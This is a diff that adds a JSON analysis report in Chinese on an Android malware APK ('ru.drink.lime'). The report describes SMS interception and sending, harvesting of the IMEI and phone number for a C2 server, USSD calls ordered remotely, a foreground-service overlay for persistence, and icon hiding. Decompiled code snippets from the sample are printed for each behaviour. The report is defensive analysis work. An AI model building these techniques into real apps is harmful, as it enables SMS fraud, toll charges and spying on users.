@@ -1,0 +1,209 @@
+{
+  "APK信息": {
+    "文件名": "f2aa045c12a6673e1f5f323aaeeccff8447a0f2ea16667c63ef7501dd919b8d1.apk",
+    "sha256": "f2aa045c12a6673e1f5f323aaeeccff8447a0f2ea16667c63ef7501dd919b8d1",
+    "包名": "ru.drink.lime",
+    "应用名": "System",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 221.3
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\prototype\\Message;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public class Message {\n    private ArrayList<PendingIntent> deliveryIntents;\n    BroadcastReceiver deliveryReceiver;\n}",
+          "malicious_code_snippet_context": "  import ru.drink.lime.db.Notifications;\n  \n  /* loaded from: classes.dex */\n>>> public class Message {\n>>>     private Context ctx;\n>>>     private long date;\n>>>     private ArrayList<PendingIntent> deliveryIntents;\n      BroadcastReceiver deliveryReceiver;\n      private String description;\n      private int id;",
+          "behavior_description": "该类导入了SmsManager并定义了用于跟踪短信发送状态的PendingIntent和BroadcastReceiver，表明其具备静默发送短信的能力。在恶意样本背景下，通常用于后台向指定号码发送短信，可能导致用户扣费或作为C2通信手段。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lru\\drink\\lime\\SmsReceiver;",
+          "method_signature": "if(block)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean block = new Settings(context).testFilter(phone);\nif (block) {\n    abortBroadcast();\n}\nMessage msg = new Message(body, phone, 0, context);\nMessages messages = new Messages(context);\nmessages.insert(msg);",
+          "malicious_code_snippet_context": "                  phone = mess[i].getOriginatingAddress();\n                  body = body + mess[i].getMessageBody();\n              }\n>>>             boolean block = new Settings(context).testFilter(phone);\n>>>             if (block) {\n>>>                 M.i(\"abortBroadcast!\");\n>>>                 abortBroadcast();\n>>>             }\n>>>             Message msg = new Message(body, phone, 0, context);\n>>>             Messages messages = new Messages(context);\n              messages.insert(msg);\n          }\n      }",
+          "behavior_description": "SmsReceiver接收到短信广播后，从PDU中解析出发送方号码(phone)和短信内容(body)，通过testFilter判断是否需要拦截，若需要则调用abortBroadcast()阻止短信到达用户收件箱，同时将拦截的短信内容存入本地数据库，实现短信静默拦截与窃取",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\SocketService;",
+          "method_signature": "registration()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String imei = telephonyManager.getDeviceId();\nString operatorName = telephonyManager.getSimOperatorName();\nString phone = telephonyManager.getLine1Number();\nString country = telephonyManager.getSimCountryIso();\nString operatorMnc = telephonyManager.getNetworkOperator();\nobj.put(\"imei\", imei);",
+          "malicious_code_snippet_context": "          TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Messages.COLUMN_PHONE);\n          JSONObject obj = new JSONObject();\n          try {\n>>>             String imei = telephonyManager.getDeviceId();\n>>>             String clientSdkVersion = Build.VERSION.RELEASE;\n>>>             String operatorName = telephonyManager.getSimOperatorName();\n>>>             String phone = telephonyManager.getLine1Number();\n>>>             String country = telephonyManager.getSimCountryIso();\n>>>             String operatorMnc = telephonyManager.getNetworkOperator();\n              int mcc = Integer.parseInt(operatorMnc.substring(0, 3));\n              M.e(\"registration() :: clientSdkVersion: \" + clientSdkVersion);\n              obj.put(\"imei\", imei);",
+          "behavior_description": "代码通过 TelephonyManager 获取设备的 IMEI、SIM卡运营商名称、手机号码、SIM卡国家代码和网络运营商等敏感设备信息，并将其封装入 JSONObject 中，准备通过 socket.emit 发送到远程服务器，造成用户核心隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground",
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\AdminService;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 16)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Notification.Builder builder = new Notification.Builder(this.ctx);\nbuilder.setContentIntent(null).setSmallIcon(R.drawable.ic_stat_action_info).setTicker(getResources().getText(R.string.admin_notify_title)).setContentTitle(getResources().getText(R.string.admin_notify_title)).setOngoing(false).setWhen(System.currentTimeMillis()).setSound(null).setVibrate(null).setContentText(getResources().getText(R.string.admin_notify_body));\nif (Build.VERSION.SDK_INT < 16) {\n    notify = builder.getNotification();\n} else {\n    notify = builder.build();\n}\nstartForeground(1, notify);\nWindowManager.LayoutParams params = Utils.getParams(-1, -1, true, 8388627);\nthis.view = inflate.inflate(R.layout.activity_admin, (ViewGroup) null);\nthis.windowManager.addView(this.view, params);",
+          "malicious_code_snippet_context": "          if (this.view == null) {\n              show();\n          }\n>>>         Notification.Builder builder = new Notification.Builder(this.ctx);\n>>>         builder.setContentIntent(null).setSmallIcon(R.drawable.ic_stat_action_info).setLargeIcon(BitmapFactory.decodeResource(this.ctx.getResources(), R.drawable.ic_stat_action_info)).setTicker(getResources().getText(R.string.admin_notify_title)).setContentTitle(getResources().getText(R.string.admin_notify_title)).setOngoing(false).setWhen(System.currentTimeMillis()).setSound(null).setVibrate(null).setContentText(getResources().getText(R.string.admin_notify_body));\n>>>         if (Build.VERSION.SDK_INT < 16) {\n>>>             notify = builder.getNotification();\n>>>         } else {\n>>>             notify = builder.build();\n>>>         }\n>>>         startForeground(1, notify);\n>>>         return 1;\n>>>     }\n>>> \n      /* JADX INFO: Access modifiers changed from: private */\n      public void show() {\n          WindowManager.LayoutParams params = Utils.getParams(-1, -1, true, 8388627);",
+          "behavior_description": "该代码通过 startForeground() 启动前台服务实现持久化保活，同时利用 WindowManager.addView() 以全屏参数(-1,-1)叠加一个 activity_admin 布局视图覆盖屏幕。通知设置为静默(无声音、无振动)、非持续(setOngoing(false))，隐蔽地维持服务运行。结合类名 AdminService 和布局中的 btnActivate 按钮，这是典型的勒索软件锁屏保活机制，通过前台服务确保锁屏界面持续覆盖用户设备，阻止正常使用。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\SocketService;",
+          "method_signature": "call(Object... args)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String phone = data.optString(Messages.COLUMN_PHONE);\nIntent callIntent = new Intent(\"android.intent.action.CALL\", Utils.ussdToCallableUri(phone));\ncallIntent.addFlags(268435456);\nSocketService.this.startActivity(callIntent);",
+          "malicious_code_snippet_context": "                  int id = data.optInt(\"id\");\n                  int type = data.optInt(\"type\");\n                  String body = data.optString(Notifications.COLUMN_BODY);\n>>>                 String phone = data.optString(Messages.COLUMN_PHONE);\n>>>                 Message msg = new Message(id, body, phone, BuildConfig.FLAVOR, 0L, type, SocketService.this.ctx);\n>>>                 msg.sendSms();\n>>>             }\n          });\n          this.socket.on(\"make_ussd\", new Emitter.Listener() { // from class: ru.drink.lime.SocketService.14\n              @Override // io.socket.emitter.Emitter.Listener",
+          "behavior_description": "恶意软件通过Socket连接接收远程C2服务器下发的'make_ussd'指令，从JSON数据中提取phone字段，构造ACTION_CALL Intent并调用startActivity()直接发起USSD通话。ACTION_CALL会绕过用户确认直接拨号，攻击者可远程控制设备拨打付费号码或执行USSD代码，导致用户经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\MainActivity;",
+          "method_signature": "onCreate(Bundle savedInstanceState)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager p = getPackageManager();\nComponentName componentName = new ComponentName(getPackageName(), getClass().getName());\np.setComponentEnabledSetting(componentName, 2, 1);\nfinish();",
+          "malicious_code_snippet_context": "          super.onCreate(savedInstanceState);\n          this.app = (Application) getApplication();\n          this.settings = new Settings(this);\n>>>         PackageManager p = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(getPackageName(), getClass().getName());\n>>>         p.setComponentEnabledSetting(componentName, 2, 1);\n>>>         finish();\n      }\n  }",
+          "behavior_description": "在 MainActivity.onCreate() 中，通过 getPackageManager() 获取 PackageManager 实例，构造当前 Activity 的 ComponentName，调用 setComponentEnabledSetting() 将自身组件状态设为 DISABLED（参数值2），随后立即调用 finish() 关闭 Activity。这使得应用启动后图标从启动器中消失，用户无法通过常规方式找到并卸载应用，是恶意软件常用的隐蔽驻留手法。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
